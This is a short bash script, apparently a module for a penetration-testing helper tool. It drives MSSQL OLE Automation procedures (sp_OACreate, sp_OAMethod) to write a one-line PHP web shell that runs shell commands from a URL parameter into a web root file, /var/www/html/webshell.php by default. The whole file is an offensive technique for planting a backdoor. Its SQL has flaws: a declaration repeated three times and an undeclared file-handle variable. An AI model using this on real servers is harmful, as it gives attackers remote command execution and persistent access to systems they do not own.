#!/bin/bash

: '
mssql: write shell with Ole Automation procedure
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
OUTPUT_FILE_FIELD=$(form_item  "output file" "output_file" "/var/www/html/webshell.php")

# Generate GUI form
generate_form "${OUTPUT_FILE_FIELD}"

OUTPUT_FILE=${form_data["output_file"]}

execute_command "DECLARE @OLE INT"
create_new_line
sleep 0.8

execute_command "DECLARE @OLE INT"
create_new_line
sleep 0.8

execute_command "EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT"
create_new_line
sleep 0.8

execute_command "EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '${OUTPUT_FILE}', 8, 1"
create_new_line
sleep 0.8

execute_command "EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec(\$_GET[\"c\"]);?>'"
create_new_line
sleep 0.8

execute_command "EXECUTE sp_OADestroy @FileID"
create_new_line
sleep 0.8

execute_command "EXECUTE sp_OADestroy @OLE"
create_new_line
sleep 0.8

execute_command "DECLARE @OLE INT"
create_new_line
sleep 0.8

execute_command "GO"
create_new_line
